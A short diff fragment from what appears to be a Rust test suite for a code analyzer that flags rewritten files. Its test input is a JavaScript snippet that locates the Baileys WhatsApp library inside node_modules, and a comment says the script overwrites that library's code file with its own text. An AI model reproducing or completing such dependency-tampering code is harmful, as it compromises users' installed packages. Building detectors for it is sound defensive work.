         // path joined from node_modules, its code file written with the script's own text
         let rewrote = |src: &str| -> Vec<(usize, String)> {
             let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-            facts_here(&text, Dialect::Js).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
+            facts_here(std::sync::Arc::from(&text[..]), Dialect::Js).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
         };
         let src = "const fs = require('fs');\nconst path = require('path');\nfunction findTarget() {\n  \
                    const possible = [path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys')];\n  \
